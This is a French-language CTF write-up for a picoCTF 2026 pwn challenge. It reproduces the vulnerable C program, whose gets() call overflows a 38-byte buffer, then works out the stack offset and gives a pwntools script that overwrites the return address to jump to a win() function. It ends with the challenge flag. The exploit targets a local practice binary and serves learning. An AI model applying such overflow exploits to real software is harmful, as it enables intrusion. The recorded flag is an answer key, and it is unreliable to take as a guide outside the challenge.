---
# Imported from Obsidian: CTF/picoCTF/picoCTF_2026/offset-cycle.md
title: Offset-cycle
category: Pwn
ctf: picoCTF 2026
date: 2026-08-07
summary: 'Pour écraser l''adresse de retour, vous devez remplir :'
tags:
- picoctf-2026
- pwn
lang: fr
imported: true
---

### Catégorie : 

Code source :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 38
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "You may not have plenty of time",
                    "to solve the challenge.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

1. Analyse des faits

- **Buffer** : `buf` dans `vuln` fait **38 octets**.
- **Cible** : La fonction `win()` située à l'adresse `080491f6` (trouvée via `nm`).
- **Architecture** : D'après l'adresse (8 caractères hexadécimaux), c'est du **x86 (32 bits)**. En 32 bits, l'adresse de retour sur la pile se trouve juste après le **Saved EBP** (4 octets).

2. Calcul de l'Offset

Pour écraser l'adresse de retour, vous devez remplir :

1. Le buffer : **38 octets**.
2. Le padding d'alignement (souvent ajouté par le compilateur).
3. Le "Saved EBP" : **4 octets**.

En 32 bits, l'offset typique est souvent `BUFSIZE + 4` ou `BUFSIZE + 12` selon l'alignement. Comme le script `start` change de fichier (16.c puis 12.c), l'offset peut varier légèrement.

### Script d'exploitation 

```
from pwn import *

# Configuration
binary_path = './12' # Changez selon le numéro généré
win_addr = 0x080491f6

# 1. Trouver l'offset automatiquement
p = process(binary_path)
# On envoie un pattern cyclique pour trouver la distance exacte
payload = cyclic(100)
p.sendlineafter("string: ", payload)
p.wait()

# Si vous avez accès au core dump ou si vous testez localement :
# offset = cyclic_find(p.corefile.eip) 
# Sinon, par tâtonnement sur ce type de challenge :
offset = 38 + 12 # Valeur très courante sur ces exercices (38 + alignment + EBP)

# 2. Construction du payload final
# [Padding de 'A'] + [Adresse de win en Little Endian]
payload = b"A" * offset + p32(win_addr)

# 3. Envoi
log.info(f"Envoi du payload avec offset {offset}...")
io = process(binary_path)
io.sendlineafter("string: ", payload)
print(io.recvall().decode())

```

### Flag : 

```
picoCTF{u_Us3d_pwNt00L5_18428ce4}

```
